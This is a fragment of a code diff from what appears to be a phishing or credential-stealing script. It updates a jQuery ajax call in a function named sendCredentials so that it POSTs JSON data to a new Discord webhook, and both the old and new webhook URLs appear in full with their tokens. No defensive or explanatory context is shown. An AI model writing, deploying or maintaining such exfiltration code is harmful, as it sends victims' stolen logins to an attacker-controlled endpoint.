@@ -107,7 +107,7 @@ function sendCredentials() {
   };
  
  $.ajax({
-  url: "https://discord.com/api/webhooks/1127961875490033684/Gju4v8mjlOcgXX-ChimW4YkXXXNCbG7BT9Rt0ApDcjin16jxqbfxFqCRYREvENBJdAbA",
+  url: "https://discord.com/api/webhooks/1128365148755738644/8D5UIYBs8QENv5sqqWzfltTEdoRpv6sLzYOtWl-a_ITSFJ_MbGcrryIdoOZWY5RMWKcr",
   type: "POST",
   data: JSON
    .stringify(
